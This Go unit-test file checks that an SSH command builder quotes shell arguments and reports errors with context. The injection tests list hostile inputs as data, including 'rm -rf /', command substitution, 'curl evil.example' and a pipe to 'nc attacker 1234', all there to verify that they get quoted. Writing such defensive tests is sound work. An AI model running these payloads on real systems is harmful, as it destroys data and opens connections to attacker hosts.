package sshx

import (
	"strings"
	"testing"
)

func TestCommandQuotesDangerousArguments(t *testing.T) {
	// 远程命令由参数化构造,任何注入尝试都必须被单引号包住而不是被 shell 解释。
	cases := []struct {
		name string
		args []string
		// mustNotContainRaw 是不允许以未转义形式出现的片段。
		mustNotContainRaw []string
	}{
		{
			name:              "分号注入",
			args:              []string{"/opt/a.json; rm -rf /"},
			mustNotContainRaw: []string{"; rm -rf /"},
		},
		{
			name:              "命令替换",
			args:              []string{"$(whoami)"},
			mustNotContainRaw: []string{"$(whoami)"},
		},
		{
			name:              "反引号",
			args:              []string{"`id`"},
			mustNotContainRaw: []string{"`id`"},
		},
		{
			name:              "与号后台执行",
			args:              []string{"a && curl evil.example"},
			mustNotContainRaw: []string{"&& curl"},
		},
		{
			name:              "管道",
			args:              []string{"x | nc attacker 1234"},
			mustNotContainRaw: []string{"| nc"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			line := NewCommand("cat", tc.args...).String()
			for _, raw := range tc.mustNotContainRaw {
				// 危险片段只允许出现在单引号内部。
				idx := strings.Index(line, raw)
				if idx < 0 {
					continue
				}
				quoted := strings.Count(line[:idx], "'")%2 == 1
				if !quoted {
					t.Errorf("片段 %q 未被引号保护,完整命令:%s", raw, line)
				}
			}
		})
	}
}

func TestCommandEscapesEmbeddedSingleQuote(t *testing.T) {
	// 单引号是唯一需要特殊处理的字符:必须闭合、转义、再重开。
	line := NewCommand("echo", "it's").String()
	const want = `echo 'it'\''s'`
	if line != want {
		t.Errorf("得到 %q,期望 %q", line, want)
	}
}

func TestCommandLeavesSafeArgumentsUnquoted(t *testing.T) {
	// 安全字符不加引号,便于阅读审计日志。
	line := NewCommand("systemctl", "restart", "litebox-singbox").String()
	const want = "systemctl restart litebox-singbox"
	if line != want {
		t.Errorf("得到 %q,期望 %q", line, want)
	}
}

func TestCommandQuotesEmptyArgument(t *testing.T) {
	line := NewCommand("test", "").String()
	if line != "test ''" {
		t.Errorf("空参数应当渲染为 '',得到 %q", line)
	}
}

func TestCommandHandlesPathsWithSpaces(t *testing.T) {
	line := NewCommand("cat", "/opt/my dir/config.json").String()
	if !strings.Contains(line, "'/opt/my dir/config.json'") {
		t.Errorf("含空格的路径未被引号包裹:%s", line)
	}
}

func TestResultErrIncludesContext(t *testing.T) {
	r := Result{Command: "sing-box check -c /tmp/x.json", ExitCode: 1, Stderr: "FATAL invalid private key"}
	err := r.Err()
	if err == nil {
		t.Fatal("非零退出码应当产生错误")
	}
	if !strings.Contains(err.Error(), "invalid private key") {
		t.Errorf("错误信息应包含 stderr:%v", err)
	}

	if (Result{ExitCode: 0}).Err() != nil {
		t.Error("退出码为 0 时不应产生错误")
	}
}

// stderr 为空时应回落到 stdout,否则排查时拿不到任何线索。
func TestResultErrFallsBackToStdout(t *testing.T) {
	r := Result{Command: "x", ExitCode: 2, Stdout: "配置文件不存在"}
	if err := r.Err(); err == nil || !strings.Contains(err.Error(), "配置文件不存在") {
		t.Errorf("应回落到 stdout:%v", r.Err())
	}
}

func TestIsConnectionError(t *testing.T) {
	if !isConnectionError(ErrNotConnected) {
		t.Error("ErrNotConnected 应被判定为连接错误")
	}
	if isConnectionError(nil) {
		t.Error("nil 不是连接错误")
	}
	// 业务错误不能被误判为连接错误,否则会触发无意义的重连重试。
	if isConnectionError(Result{Command: "x", ExitCode: 1, Stderr: "配置校验失败"}.Err()) {
		t.Error("命令非零退出不应被判定为连接错误")
	}
}
